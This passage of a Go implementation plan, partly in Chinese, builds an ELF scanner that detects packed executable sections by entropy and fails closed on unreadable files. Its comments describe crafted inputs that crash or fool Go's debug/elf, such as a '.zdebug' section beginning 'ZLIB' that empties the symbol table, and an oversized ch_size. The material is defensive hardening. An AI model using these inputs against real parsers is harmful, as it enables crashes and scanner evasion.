	path := writeTestBytes(t, dir, "packed.so", elfCompressedFixture(t, declared, payload))

	// The fixture must be the shape the check is for: a compressed executable
	// section whose reported size is the declared one.
	f, err := elf.Open(path)
	if err != nil {
		t.Fatalf("elf.Open on the fixture: %v", err)
	}
	var sec *elf.Section
	for _, s := range f.Sections {
		if s.Flags&elf.SHF_EXECINSTR != 0 {
			sec = s
		}
	}
	if sec == nil {
		f.Close()
		t.Fatal("fixture has no executable section")
	}
	size := sec.Size
	f.Close()
	if size != declared {
		t.Fatalf("fixture section size = %d, want %d (debug/elf must take it from ch_size)", size, declared)
	}

	set := newTestEvidence(path, KindELF)
	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF on a compressed section: %v", err)
	}
	if !set.Bound.Structural {
		t.Fatalf("a compressed executable section declaring %d bytes recorded no structural bound; bound = %+v", declared, set.Bound)
	}
	if !strings.Contains(set.Bound.Reason, "readable") {
		t.Errorf("bound reason = %q, want the short-read reason", set.Bound.Reason)
	}
	for _, l := range set.Lines {
		if l.Source == SourceEntropy {
			t.Errorf("an under-read executable section produced entropy evidence %q", l.Text)
		}
	}
}

// TestCollectELFEvidenceNormalizesAZeroConfig pins that collectELF resolves a
// zero BinaryConfig to the defaults, as its peers do. Without that,
// MaxStreamBytes of 0 spends the per-file budget before the first section, so
// every executable section records a "0-byte per-file budget was spent"
// structural bound and the package is deleted - a false block produced by a
// caller that knows about only one field. The same file under the default config
// is clean, so the two must agree.
func TestCollectELFEvidenceNormalizesAZeroConfig(t *testing.T) {
	dir := t.TempDir()
	raw := elfFixtureBytes(t, elfSpec{
		imports:  []string{"dlopen"},
		text:     []byte("an ordinary executable section of perfectly normal code"),
		textExec: true,
	})
	path := writeTestBytes(t, dir, "normal.so", raw)

	zero := newTestEvidence(path, KindELF)
	if err := collectELF(path, zero, BinaryConfig{}); err != nil {
		t.Fatalf("collectELF with a zero config: %v", err)
	}
	def := newTestEvidence(path, KindELF)
	if err := collectELF(path, def, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectELF with the default config: %v", err)
	}

	if zero.Bound.Structural {
		t.Errorf("a zero config produced a structural bound %+v; the zero value must mean the defaults", zero.Bound)
	}
	if zero.Bound != def.Bound {
		t.Errorf("zero config bound = %+v, default config bound = %+v; they must agree", zero.Bound, def.Bound)
	}
	if len(zero.Lines) != len(def.Lines) {
		t.Fatalf("zero config produced %d evidence lines, default config produced %d", len(zero.Lines), len(def.Lines))
	}
	for i := range zero.Lines {
		z, d := zero.Lines[i], def.Lines[i]
		if z.Source != d.Source || z.Offset != d.Offset || z.Text != d.Text {
			t.Errorf("line %d differs: zero config (%s %d %q), default config (%s %d %q)",
				i, z.Source, z.Offset, z.Text, d.Source, d.Offset, d.Text)
		}
	}
}

// TestCountSectionStreamsTheSameHistogramAsABufferRead pins that chunking the
// section read does not change the number it produces. The fixture is larger
// than one chunk so the loop body runs more than once: an implementation that
// reset its counters per chunk, or dropped the final short chunk, would still
// pass a single-chunk test and would make an ELF section's entropy depend on its
// size rather than on its bytes.
func TestCountSectionStreamsTheSameHistogramAsABufferRead(t *testing.T) {
	data := make([]byte, entropyChunkBytes+1234)
	for i := range data {
		data[i] = byte((i * 31) % 251)
	}

	counts, n, err := countSection(bytes.NewReader(data), 0)
	if err != nil {
		t.Fatalf("countSection: %v", err)
	}
	if n != int64(len(data)) {
		t.Fatalf("countSection read %d bytes, want %d", n, len(data))
	}
	if got, want := shannonEntropy(counts, n), measureEntropy(data); math.Abs(got-want) > 1e-12 {
		t.Errorf("streamed entropy = %v, buffered = %v; the two must agree", got, want)
	}

	// A budget smaller than the section stops the read and reports how far it
	// got, which is the number the caller compares against the declared size.
	const budget = int64(4096)
	if _, n, err := countSection(bytes.NewReader(data), budget); err != nil || n != budget {
		t.Errorf("countSection with a %d-byte budget read %d bytes (err=%v), want exactly %d", budget, n, err, budget)
	}
}

func containsString(haystack []string, needle string) bool {
	for _, s := range haystack {
		if s == needle {
			return true
		}
	}
	return false
}
```

本步还要给 Task 3 的 `TestEntropyVerdictIsMeasuredNotAssumed` 补一段断言：流式路径与内存路径必须给出**同一行**。它落在本步而不是 Task 3，理由与上面那两个符号相同——Task 3 里两条路还不都存在（`entropyVerdictFromCounts` 与 `countSection` 都是 Task 5 才引入的），把断言留在 Task 3 就是描述一个从未存在过的状态。追加到那条测试的末尾：

```go
	// The streaming path and the in-memory path must agree, because an ELF
	// section is measured one way and a container member the other. Both are
	// driven from the same bytes here, and the assertion is equality of the
	// rendered line rather than of the number: the line is what reaches the
	// evidence set, so a divergence that only shows up in the formatting would
	// otherwise go unnoticed.
	var counts [256]int64
	for _, b := range uniform {
		counts[b]++
	}
	streamed, streamedOK := entropyVerdictFromCounts(".text", counts, int64(len(uniform)), cfg)
	inMemory, inMemoryOK := entropyVerdict(".text", uniform, cfg)
	if streamed != inMemory || streamedOK != inMemoryOK {
		t.Errorf("streamed = (%q, %v), in-memory = (%q, %v); the two paths must agree",
			streamed, streamedOK, inMemory, inMemoryOK)
	}
```

- [ ] **Step 3: 跑测试确认失败**

本步 `binary_evidence_test.go` 的 import 块至少要含 `"bytes"`（`bytes.NewReader`/`bytes.Repeat`）、`"debug/elf"`（夹具守卫用例要自己 `elf.Open` 一次）、`"fmt"`（拼接 `size=` 的期望串）、`"math"`（流式与内存两条路比对熵值）、`"strings"`、`"testing"`。Go 拒绝未使用的 import，所以这些是随本步的用例一起加进来的。

```bash
go test ./internal/codeaudit/ -run 'TestELFFixture|TestCollectELF|TestCountSection' 2>&1 | head -20
```

预期：`go test` **不输出任何测试结果**，而是报**构建失败**，错误指向 Task 5 尚未定义的那些符号（首条通常是 `undefined: collectELF`，还会有 `undefined: countSection`、`undefined: entropyVerdictFromCounts`、`undefined: entropyChunkBytes`）。

`TestELFFixtureIsReadByTheStandardLibrary` 在本步**不可能 PASS**：Go 把一个测试包当一个编译单元，`collectELF` 未定义时整包编不过，测试二进制根本不会生成——"夹具守卫先于它所守护的实现通过"在 Go 里不是一个可达的状态。所以本步的判据不是"守卫通过"，而是**失败的原因是对的**：错误必须是"该有的符号还没定义"，而**不得**指向夹具构造器本身（除了 `undefined: …`，若还出现 `elfFixtureBytes` 的类型或语法错误，说明夹具写坏了，先修夹具）。夹具守卫的断言真正生效在 Step 5——包能编过之后，它先于任何抽取断言运行，那时它才承担自己的职责。

> 若到 Step 5 守卫才失败，按 `debug/elf` 的报错逐个字段核对：最常见的是 `e_shstrndx` 与 `.shstrtab` 的节索引不一致（本文档中为 6，节表共 7 项：0 空、1 `.text`、2 `.init`、3 `.dynstr`、4 `.dynsym`、5 `.dynamic`、6 `.shstrtab`），或 `sh_link` 未指向 `.dynstr`（本文档中为 3）。索引固定不随 spec 变化，所以 `.dynsym` 被 stripped 掉时留下的是一个全零的 SHT_NULL 头，而不是把后面的节全部前移——这样 `e_shstrndx` 对每个夹具都是同一个数。

- [ ] **Step 4: 实现 ELF 抽取**

追加到 `binary_evidence.go`（import 块补 `"debug/elf"`）：

```go
// collectELF reads a file's ELF structure into evidence.
//
// Two things are read, and they answer different questions. The dynamic symbol
// table names what the binary calls into its libraries - the only such evidence
// a stripped binary retains, and the reason this parse is worth having at all.
// The sections report what the file is made of, which is where packing shows:
// executable code is not random, so an executable section that measures near
// eight bits per byte has been compressed or encrypted, and something has to
// unpack it at run time for it to run.
//
// There is no strings pass here, and the plan says so rather than leaving it to
// be rediscovered: Task 6 Step 4 rewrites this function to stream the file's
// literals first and parse it second, through streamWithSizeSwitch so that a
// large shared object is windowed at its ends like any other large blob. The
// split is not an oversight to be "fixed" early - the size decision is what the
// ELF path shares with every other kind, and writing it here would mean writing
// it twice, in the one task that does not yet have the size switch. What Task 5
// owns is the structure, and its tests assert exactly that.
func collectELF(path string, set *EvidenceSet, cfg BinaryConfig) error {
	// Every other entry point into the evidence set resolves its config first -
	// newEvidenceSet and newStringScanner both call normalizeBinaryConfig - and this
	// function reads cfg.MaxStreamBytes directly for the per-file section budget, so
	// it has to as well. Without the line a caller that passed a zero
	// BinaryConfig{} would get a zero budget, every executable section would record
	// "the budget was spent" as a structural bound, and an executable-kind file
	// would be deleted for a configuration that was merely left unset. That is a
	// footgun aimed at whichever task wires the channel, and it is invisible in
	// every test that builds its config through DefaultBinaryConfig.
	cfg = normalizeBinaryConfig(cfg)

	f, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()

	ef, err := elf.NewFile(f)
	if err != nil {
		// A file with ELF magic that will not parse is a file this scan did not
		// read. Returning the error is what turns it into an incomplete scan
		// rather than a clean one.
		return fmt.Errorf("parse elf %s: %w", path, err)
	}
	defer ef.Close()

	// A file with no section header table is a structural gap, and this check is
	// the removal of a fail-open rather than a nicety. The packing detector's
	// input is the executable sections; with no section table there are none to
	// measure, so the file used to fall through the section loop, produce no
	// entropy line and no bound, and pass as clean - a pass that says "no packing
	// found" about a file that was never examined for packing. The input most
	// likely to have no section table is one whose section table was deliberately
	// removed, which is exactly the file this detector exists for.
	//
	// The reason names the real condition. It is not "no symbol table": a
	// sectionless file has no .dynsym, but so does a stripped one, and a stripped
	// binary is ordinary and must not be treated this way. What is absent is the
	// section header table, and that is what the evidence says.
	if len(ef.Sections) == 0 {
		set.markStructural("no section header table: the executable-section entropy pass had nothing to measure")
	}

	// The interpreter and the soname are notices rather than measurements: they
	// say what kind of object this is, and a reader comparing two reports uses
	// them to tell a program from a library.
	for _, p := range ef.Progs {
		if p.Type != elf.PT_INTERP {
			continue
		}
		// The interpreter is a NUL-terminated path, and PT_INTERP is tiny by
		// construction; the limit is here so that a malformed file claiming a
		// gigabyte program header cannot make this read one.
		data, readErr := io.ReadAll(io.LimitReader(p.Open(), 4096))
		if readErr != nil {
			break
		}
		set.addStructured(SourceNotice, "interpreter "+strings.TrimRight(string(data), "\x00"))
	}
	if names, err := ef.DynString(elf.DT_SONAME); err == nil {
		for _, n := range names {
			set.addStructured(SourceSection, "soname "+n)
		}
	}
	if libs, err := ef.ImportedLibraries(); err == nil {
		for _, n := range libs {
			set.addStructured(SourceNeeded, n)
		}
	}

	// DynamicSymbols rather than ImportedSymbols: the latter drops the symbol's
	// value and section, and the section is what separates an import (SHN_UNDEF)
	// from a definition. Only imports are evidence of what the binary can call.
	//
	// SHT_SYMTAB is deliberately not read as a fallback, and the notice below is
	// worded to say only what was observed rather than to guess. A static binary
	// has no .dynsym but does carry .symtab, so a "stripped or static" notice was
	// false for it; and .symtab's entries are mostly this file's own defined
	// symbols, so using it as a capability source would mean matching the
	// program's own identifiers - the same false-positive class the free-string
	// families were demoted for. Task 8's rule table is unchanged by this: no new
	// evidence source is introduced, which is the point.
	//
	// The dynamic symbol read is guarded rather than attempted and recovered,
	// because debug/elf's symbol reader panics instead of returning an error on
	// one input, and that input is reachable from an untrusted file: ClassifyBinary
	// returns KindELF on the four magic bytes alone and does not look at EI_CLASS,
	// so every size and name the reader acts on is a field the file itself chooses.
	//
	// getSymbols64 (file.go:675-691) fetches the section's data, rejects it only
	// when len(data)%Sym64Size != 0, and then slices data[Sym64Size:] to drop the
	// reserved null entry. Zero is a multiple of every entry size, so a
	// zero-length buffer passes that check and the slice panics with "slice bounds
	// out of range [24:0]"; every other short length is not a multiple and takes
	// the error return instead. The panic set is therefore exactly {0}, not every
	// length below one entry - which is why the guard is "the buffer is empty" and
	// not "the size is smaller than a symbol header". A range guard is not merely
	// wider than needed, it is backwards: lengths 1..23 already fail the scan
	// closed through the error path, and holding them back here would convert that
	// failure into a silent skip - a new fail-open, in the one function whose whole
	// argument is that not looking must not read as clean.
	//
	// There is deliberately no class test here. getSymbols32 (file.go:631-633)
	// carries an explicit `if len(data) == 0` return of its own, before its slice,
	// so a 32-bit table cannot panic and needs no guard to stay safe. The fact the
	// guard is about - the section yields no bytes - is the same for both classes,
	// and a table that yields no bytes holds no symbols either way, so one uniform
	// check covers both without branching on EI_CLASS, a field ClassifyBinary never
	// looks at.
	//
	// symbolTableIsEmpty asks the question the way the reader gets its answer, and
	// that is not the same as reading the section header: Section.Data (file.go:107)
	// is saferio.ReadData(s.Open(), s.Size) with the arguments evaluated left to
	// right, and Section.Open (file.go:126) rewrites s.Size at file.go:146 for a
	// section whose name starts with ".zdebug" whose first twelve bytes are "ZLIB",
	// taking the value from bytes the file chooses. A body of "ZLIB" plus eight
	// zero bytes therefore makes that size zero - ReadData allocates nothing,
	// io.ReadFull on an empty buffer succeeds vacuously, and it returns a non-nil
	// empty slice with a nil error - and getSymbols64 sees len(data) == 0, passes
	// its multiple check and panics. None of this is visible in sh_size, which stays
	// an ordinary 12, so a reader checking the header would conclude the guard is
	// unnecessary; that is the mistake this comment exists to prevent.
	//
	// SectionByType returns the first section of the requested type, which is what
	// makes the shape cheap to reach: a file only has to put its ".zdebug" section
	// ahead of its real one.
	//
	// A table that yields no bytes holds no symbols, so skipping it reads as
	// "imports nothing", which is the true statement about a zero-entry table, and
	// raises no bound because nothing was left unexamined. Calling a present table
	// "absent" would be a false statement, so no notice is written on this path.
	dynsym := ef.SectionByType(elf.SHT_DYNSYM)
	switch {
	case dynsym == nil:
		set.addStructured(SourceNotice, "no dynamic symbol table (SHT_DYNSYM absent)")
	default:
		empty, derr := symbolTableIsEmpty(dynsym)
		if derr != nil {
			return fmt.Errorf("read dynamic symbols of %s: %w", path, derr)
		}
		if empty {
			break
		}
		syms, err := ef.DynamicSymbols()
		if err != nil && !errors.Is(err, elf.ErrNoSymbols) {
			return fmt.Errorf("read dynamic symbols of %s: %w", path, err)
		}
		if errors.Is(err, elf.ErrNoSymbols) {
			set.addStructured(SourceNotice, "no dynamic symbol table (SHT_DYNSYM absent)")
		}
		for _, s := range syms {
			if s.Section != elf.SHN_UNDEF || elf.ST_BIND(s.Info) != elf.STB_GLOBAL {
				continue
			}
			set.addStructured(SourceDynsym, s.Name)
		}
	}

	// The per-file read budget for this parse, spent across all the sections
	// rather than reset for each one. A budget per section would make the cost of
	// a file scale with how many executable sections it declares, and a file can
	// declare as many as it likes - the same unbounded-work shape the streaming
	// pass's budget exists to stop, reintroduced through the section headers.
	budget := cfg.MaxStreamBytes
	for _, sec := range ef.Sections {
		executable := sec.Flags&elf.SHF_EXECINSTR != 0
		// size= is the section header's declared size, not a count of bytes this
		// pass read. The two differ when the section claims more than the file
		// holds, and that case gets its own line below rather than being folded
		// into this one - a reader comparing size= against a shortfall they cannot
		// see would have no way to tell the claim from the read. For an
		// SHF_COMPRESSED section sec.Size is the compression header's ch_size
		// rather than sh_size, which is the same "declared, not observed" value
		// and is also the reason the shortfall check below compares unsigned.
		set.addStructured(SourceSection, fmt.Sprintf("%s size=%d executable=%t", sec.Name, sec.Size, executable))
		if !executable || sec.Size == 0 {
			continue
		}
		if budget <= 0 {
			// Not a zero-budget read: countSection treats a non-positive budget as
			// "unlimited", which is right for a caller with no bound and wrong
			// here. The spend is what names the limit.
			set.markStructural(fmt.Sprintf("section %s not read: the %d-byte per-file budget was spent", sec.Name, cfg.MaxStreamBytes))
			continue
		}
		counts, read, readErr := countSection(sec.Open(), budget)
		budget -= read
		if readErr != nil {
			// A section that cannot be read is a gap in the evidence, not a
			// reason to abandon the file: the symbols already gathered are still
			// evidence, and the bound records the gap.
			set.markStructural(fmt.Sprintf("section %s unreadable: %v", sec.Name, readErr))
			continue
		}
		// The comparison is unsigned, and that is not a style choice. sec.Size is
		// the section header's declared size, and for an ordinary section that is
		// sh_size, which debug/elf range-checks at parse time
		// (`if int64(s.FileSize) < 0 { FormatError }`) - so the signed form would
		// be safe there. For an SHF_COMPRESSED section it is not: debug/elf takes
		// sec.Size from the compression header's ch_size and applies no such check,
		// so a crafted ch_size = 2^63 makes sec.Size a uint64 whose int64 view is
		// negative, `read < int64(sec.Size)` is false for every possible read, and
		// the section is treated as read in full - never marked structural, and,
		// because it is executable, its prefix entropy-measured and reported as
		// clean. That is the fail-open this whole check exists to close, reopened
		// by a cast. Unsigned compares the two numbers as the counts they are.
		if uint64(read) < sec.Size {
			// The section declares more bytes than were read. Two things produce
			// this and both are the same fact about the file: a sh_offset or
			// sh_size that runs past the end of it (the read stops at EOF), and a
			// per-file budget breach. Either way the entropy number would be over
			// a prefix, so it is not reported at all and the shortfall is the
			// evidence instead: a section that could not be read in full is not a
			// section that was measured, and for a format that executes,
			// "not measured" must not reach the report as "measured clean".
			set.markStructural(fmt.Sprintf("section %s declares %d bytes, %d readable", sec.Name, sec.Size, read))
			continue
		}
		if line, ok := entropyVerdictFromCounts(sec.Name, counts, read, cfg); ok {
			set.addStructured(SourceEntropy, line)
		}
	}
	return nil
}

// symbolTableIsEmpty reports whether a symbol section would hand debug/elf's
// symbol reader an empty buffer, which is the one input that reader panics on
// instead of returning an error. getSymbols64 (file.go) rejects a length that is
// not a multiple of its entry size and then slices the first entry off
// unconditionally, and zero is a multiple of every entry size - so a length of
// 1..entrySize-1 is an error that fails the scan closed and has to be left to
// the reader, while an empty buffer has to be caught here.
//
// It reads the section through Section.Data, the call the reader itself makes,
// rather than testing a size in the header, because the header size is not the
// whole story: Section.Open (file.go) rewrites Section.Size for a section named
// ".zdebug..." whose body begins with "ZLIB", taking the value from eight bytes
// the file chooses, and Section.Data is saferio.ReadData(s.Open(), s.Size) with
// those arguments evaluated left to right - so the size Data is handed is the
// one Open just wrote. A section whose on-disk sh_size looks ordinary can
// therefore still yield nothing, and a guard reading sh_size would miss it.
// Reading the data is the check that covers both routes, and it is also the safe
// direction: Data returns an error where the symbol reader would panic.
func symbolTableIsEmpty(sec *elf.Section) (bool, error) {
	data, err := sec.Data()
	if err != nil {
		return false, err
	}
	return len(data) == 0, nil
}

// countSection streams one section through the entropy histogram in fixed-size
// chunks and returns the histogram, the number of bytes it read and any read
// error.
//
// It streams because a section header may declare any size and the section may
// be read whole: an earlier version read it with io.ReadAll under a per-section
// cap, and that cap fired on ordinary real libraries. Memory here is 256 counters
// and one chunk regardless of how large the section is, so the only cost that
// scales is the read itself, and the read is bounded per file by the budget the
// caller passes (MaxStreamBytes) rather than per section - a budget that only a
// file with gigabytes of executable sections can reach.
//
// It returns the count so the caller can compare it against the declared size:
// the histogram is over a prefix whenever the read stopped early, and a prefix is
// not something this function can tell the caller about on its own.
//
// The read is clamped to what the budget has left before it is issued, the same
// way streamEvidence clamps its reads. Reading a whole chunk and testing the
// budget at the top of the loop lets one chunk walk straight past a budget
// smaller than it: a 4 KiB budget would return 65536, which overshoots the byte
// count the caller subtracts from its per-file budget and makes the count depend
// on the chunk size rather than on the budget.
func countSection(r io.Reader, budget int64) (counts [256]int64, n int64, err error) {
	buf := make([]byte, entropyChunkBytes)
	for budget <= 0 || n < budget {
		limit := len(buf)
		if budget > 0 && int64(limit) > budget-n {
			limit = int(budget - n)
		}
		read, readErr := r.Read(buf[:limit])
		for _, b := range buf[:read] {
			counts[b]++
		}
		n += int64(read)
		if readErr == io.EOF {
			return counts, n, nil
		}
		if readErr != nil {
			return counts, n, readErr
		}
	}
	return counts, n, nil
}
```

本步还要把判定从 Task 3 的 `entropyVerdict`（直接吃 `[]byte`）里抽出来，因为流式路径手里没有 `[]byte`，而给它再写一份阈值判断会让**同一个可执行节**因为读它的路径不同而得到不同的判定。所以把决策整体搬进 `entropyVerdictFromCounts`，让 `entropyVerdict` 退化成"建直方图再转交"的包装，并补上 `countSection` 用到的 `entropyChunkBytes`。

**这两个符号与这个常量只在 Task 5 引入，Task 3 的正文必须保持"`entropyVerdict` 直接吃 `[]byte`"的原样**——Task 3 已经作为 `7e37aca` 提交过，它交付的就是那一版；如果在 Task 3 的正文里写成"判定已经抽好了"，那 Task 3 就描述了一个从未存在过的状态，按顺序执行的人在 Task 3 之后会拿到一个 `entropyVerdictFromCounts` 未定义、根本编不过的包。**Task 5 是本任务里第一个需要这个拆分的步骤，所以拆分落在这里。**

改 Task 3 写下的两处，并追加常量：

```go
// measureEntropy is shannonEntropy over a buffer in memory, for the cases where
// the bytes are already in hand - a container member is the one that matters
// here. ELF sections do not use it: they are streamed through countSection in
// fixed chunks so that a section that declares a gigabyte cannot make this pass
// hold a gigabyte (see countSection), and both paths meet again in
// entropyVerdictFromCounts.
// （上面这段替换 Task 3 里那个两行的注释，函数体不变。）
func measureEntropy(data []byte) float64 { /* 同 Task 3 */ }

// entropyVerdictFromCounts renders a section's entropy as evidence, or reports
// that there is nothing to say. It is the whole of the decision, over a
// histogram rather than over bytes.
//
// It is called for executable sections only, and that restriction is the whole
// design: code is not random, so a section that holds instructions and measures
// near eight bits per byte has been compressed or encrypted and something must
// unpack it before it can run. Data is allowed to be random - a tensor blob and
// an encrypted payload look identical to this measurement - so measuring data
// would produce a finding per model file and none of them would mean anything.
//
// Only a high reading produces a line. Emitting one for every low reading would
// put a line per section per file into every prompt for no decision value, and
// the rule table matches on the "high-entropy-" prefix - so the threshold is
// applied here, where the number is, and the rule table carries only what to call
// it. That split is deliberate: severity is policy and lives in the rule table,
// the measurement is physics and lives here.
//
// Two callers reach it and they hold their bytes differently: an ELF section
// streams through countSection in fixed-size chunks and never holds the section
// at all, while a container member is already in memory. Folding both into one
// function over the histogram is what keeps them from disagreeing - if the
// threshold lived on the in-memory path as well, the two would be two
// implementations of one rule and a later edit to either would silently make an
// identical section score differently depending on which path read it.
//
// total is passed rather than summed from the counts because it is the number of
// bytes actually read, which is the byte count the entropy is normalized by, and
// because shannonEntropy already refuses a zero total (see its comment): an empty
// section returns 0, which is below every threshold, so it produces no line.
func entropyVerdictFromCounts(section string, counts [256]int64, total int64, cfg BinaryConfig) (string, bool) {
	h := shannonEntropy(counts, total)
	if h <= cfg.HighEntropyThreshold {
		return "", false
	}
	return fmt.Sprintf("high-entropy-executable-section %s %.2f", section, h), true
}

// entropyVerdict is the in-memory spelling of the same decision, for the cases
// where the bytes are already in hand (a container member). It builds the
// histogram and hands it to entropyVerdictFromCounts so that a section measured
// in memory and the same section measured by streaming cannot differ.
// （这个函数替换 Task 3 里那一版：函数体从 `h := measureEntropy(data)` 变成建直方图后转交。）
func entropyVerdict(section string, data []byte, cfg BinaryConfig) (string, bool) {
	var counts [256]int64
	for _, b := range data {
		counts[b]++
	}
	return entropyVerdictFromCounts(section, counts, int64(len(data)), cfg)
}

// entropyChunkBytes is the read size countSection uses. It is a constant rather
// than a configuration field because it is not a limit: memory is one buffer of
// this size no matter what it is set to, so making it tunable would offer an
// operator a knob whose only effect is cache behaviour. 64 KiB is a size the
// kernel and the read paths are already tuned for.
const entropyChunkBytes = 64 * 1024
```

同时给 `EvidenceSet` 补一个小方法（结构证据无字节偏移，走 `Offset: 0`）。`markStructural` 已在 Task 2 随 `streamEvidence` 的预算路径定义，这里只加 `addStructured`：

```go
// addStructured records evidence that names a property of the file rather than a
// byte range in it. Its offset is zero and stays zero: a section summary has no
// address, and inventing one would make BinaryOffset a field a reader cannot
// trust for the findings that carry it.
func (s *EvidenceSet) addStructured(src EvidenceSource, text string) {
	s.add(src, 0, text)
}
```

- [ ] **Step 5: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestELF|TestCollectELF|TestCountSection' -v
```

预期全 PASS。

> **这一版对第一节的两个决定，写在这里而不是留给读者去猜。**
>
> **一、无节表（`len(ef.Sections) == 0`）走的是"去掉 fail-open"，不是"用 PT_DYNAMIC 补回 DT_NEEDED/DT_SONAME"。** 两条路里选前者，理由是后者要先把 `PT_DYNAMIC` 的 `p_vaddr` 经 `PT_LOAD` 映射回文件偏移，再把 `DT_STRTAB` 的虚地址同样映射一次才能读字符串表——这套映射本身是一段新的、需要独立夹具与独立测试的解析逻辑，而它的产出（needed/soname）只是"这个文件依赖什么"，对"这个文件有没有被加壳"这个问题不提供任何证据。真正需要修的是**结论**：熵检测的输入是可执行节，没有节表就没有可执行节，所以旧代码在这一段直接掉出去、不产生任何行也不产生任何 bound，于是"从未检查过"被报成了"没发现加壳"。改成 `markStructural` 之后，这个文件仍然拿不到 needed/soname，但它拿到了"这次没有检查过可执行节"这个**真**陈述，并且因为没有绑定可执行类型之外的例外，它在导入判定上是有界的。**代价明确**：一个节表被删掉的正常文件（少见但存在，比如某些加壳器产出的、以及某些用 `objcopy --strip-section-headers` 处理过的文件）现在会被记为结构性缺口而不是干净通过；这是刻意的方向——对一个可执行格式，"没看"必须不等于"干净"。
>
> **二、reason 的措辞点名的是"没有节头表"，不是"没有符号表"。** 旧代码在 `errors.Is(err, elf.ErrNoSymbols)` 时写的是 `"no dynamic symbol table (stripped or static)"`，这句话对**静态链接**的二进制是假的：静态二进制没有 `.dynsym` 但有 `.symtab`，它并不 stripped；对**完全没有节表**的文件也是假的：那不是被 strip 过，是另一种情况。新措辞只陈述实际观察到的事实——`"no dynamic symbol table (SHT_DYNSYM absent)"`——并**故意不加** `SHT_SYMTAB` 作为符号证据的兜底来源：`.symtab` 里绝大多数是**本文件自己定义**的符号（函数名、局部变量），拿它当能力证据意味着去匹配程序自己的标识符，那正是字符串族被降级时所针对的同一类误报。Task 8 的规则表因此**不受影响**：没有引入新的 evidence source，这正是重点。
>
> **三、节声明长度越过文件末尾（或读不满）记为结构性缺口，`size=` 仍写声明长度。** 判据是"读到的字节数 < 节头声明的字节数"。两种情况会触发，且都是同一个事实：`sh_offset`/`sh_size` 越过了文件末尾（读在 EOF 停下），或者触到了 `MaxStreamBytes` 的每文件预算。无论哪种，熵值都只覆盖了一个**前缀**，所以这个数**不报**——报出来它会和"整个节测过"的数长得一模一样，而"没测全"对一个会执行的格式绝不能走到报告里变成"测过且干净"。替代它出现的是 `section .text declares N bytes, M readable` 这一条结构化证据。`size=` 保持声明值而不是改成读到的值，是因为读者需要能把这个声明长度和那条缺口**配对**看：如果 `size=` 悄悄变成读到的数，报告里就再也看不出节头当初声明了多少。
>
> **四、`MaxSectionBytes` 从 `BinaryConfig` 里整个删掉，不是保留成一个改了语义的东西。** 它唯一的用途就是给"`io.ReadAll` 一个节"设上限，而那个设计会对**普通的大库**开火——一个足够大的 `.so`，它的 `.text` 会跨过任何固定的节上限，而触顶记的是结构性 bound，于是"这个库比较大"变成了阻断导入的理由。宿主实测（每个真实共享对象最大的 `SHF_EXECINSTR` `PROGBITS` 节）：`libLLVM.so.20.1` 63 048 722 字节、`libclang-18.so.18` 22 284 286、Chrome 的 `liboptimization_guide_internal.so` 20 685 714、`libwireshark.so.17.0.2` 20 175 571——16 MiB 的节上限在前四个上直接触顶。注意这个上限在**已实测的输入上都不发作**：审计语料 `models/` 下一个真实 `.so` 都没有，标定误报用的那 28 个 ollama 库单节最大 2 901 464 字节，所以它的代价是潜伏的，只在包里带上一个真实大库时发作——而那正是本平台要接受的包形状。节读取改成经 `countSection` 按固定块流过直方图之后，内存是 256 个计数器加一个 `entropyChunkBytes`（64 KiB）缓冲，与节大小无关，节上限已经**没有东西可保护**。每文件的读取预算剩下 `MaxStreamBytes`，在节循环里**跨节累减**（不是每节重置，否则成本随文件声明的可执行节数量线性增长），触到它才保持结构性。字段删除要连带 Task 14 的配置键清单和 `normalizeBinaryConfig` 一起删（本节已完成）：`MaxSectionBytes` 从来没有出现在配置键清单里，`normalizeBinaryConfig` 里那段 `if cfg.MaxSectionBytes <= 0` 也一并去掉。**不要把它加回来**，也不要指望"把 16 MiB 调大一点"能解决——任何固定值都只是把发作点往后挪。
>
> **五、同一份判定只能有一个实现。** `entropyVerdict` 原本直接吃 `[]byte`，而流式路径手里没有 `[]byte`——如果给流式路径再写一份阈值判断，两条路就成了一规则两实现，日后改一处就会让**同一个节**因为读它的路径不同而得到不同的分数。所以本任务（Task 5 Step 4）把判定抽成 `entropyVerdictFromCounts(section string, counts [256]int64, total int64, cfg BinaryConfig)`，`entropyVerdict` 退化成"建直方图再转交"的包装，ELF 路径走 `countSection` + `entropyVerdictFromCounts`，容器成员路径走 `entropyVerdict`，两者在 `TestEntropyVerdictIsMeasuredNotAssumed` 里被断言必须给出同一行。**拆分落在 Task 5 而不是 Task 3**：Task 3 已作为 `7e37aca` 提交，它交付的 `entropyVerdict` 就是直接吃 `[]byte` 的那一版，而两条路要到 Task 5 才同时存在（`entropyVerdictFromCounts` 与 `countSection` 都是本任务引入的）；把拆分写进 Task 3 的正文，等于描述一个从未存在过的 Task 3，按顺序执行的人在那之后会拿到一个编译不过的包。
>
> **六、`debug/elf` 在敌意输入上有几处不设防，这里各补一道，理由是输入不可信。** 这几条都不是"防御性编程"，而是标准库的既定行为在**敌意输入**下的直接后果，而 `ClassifyBinary` 只凭四个魔数字节就把文件送进这个函数，所以每一个 ELF 形状的输入都会走到这里，包括构造出来的。**注意 `ClassifyBinary` 不看 `EI_CLASS`，`sh_size` 是文件自己挑的字段**——下面每条都要按这个前提读。
>
> 第一处是**符号节解出的内容是空的**：`getSymbols64`（`file.go:675-691`）取出节的字节、只否决 `len(data)%Sym64Size != 0`，然后做 `data = data[Sym64Size:]` 摘掉保留的第 0 项。**0 是任何表项长度的倍数**，所以一个空缓冲区通过那条检查、随即在切片上 panic `slice bounds out of range [24:0]`；而长度 1..23 都不是 24 的倍数，走的是**返回 error** 的那条路，根本到不了切片。**panic 集合因此恰好是 `{0}`，不是"所有短于一个表项的长度"。** 这个边界决定了守卫的形状：守卫是"解出来的内容是空的"，**不是**"`sh_size` 小于一个符号头"。长度区间守卫不只是"比需要的宽"，它是**反的**——1..23 今天已经被 error 路径 fail-closed 挡下了，把它们也拦下来会把那次失败改写成一次静默跳过，在这个"没看绝不能读成干净"的函数里**新开一个 fail-open**。（**本计划上一版把这道守卫写成"按 `ef.Class` 取 24/16 比长度"，那是错的**：24 和 16 是**表项**长度，不是"至少要有一个表项"的判据，而且照它写的区间守卫会把 1..23 从 error 路径改写成跳过。源码行号写在这里，是为了让下一个人自己去核，而不是重新推理一遍。）
>
